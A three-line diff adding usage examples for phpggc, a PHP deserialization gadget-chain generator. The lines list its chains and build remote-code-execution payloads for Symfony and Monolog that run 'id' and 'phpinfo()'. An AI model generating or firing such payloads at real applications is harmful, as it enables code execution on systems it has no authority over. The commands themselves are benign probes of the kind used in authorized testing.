@@ -1,0 +1,3 @@
+phpggc -l
+phpggc symfony/rce1 id
+phpggc monolog/rce1 assert 'phpinfo()'
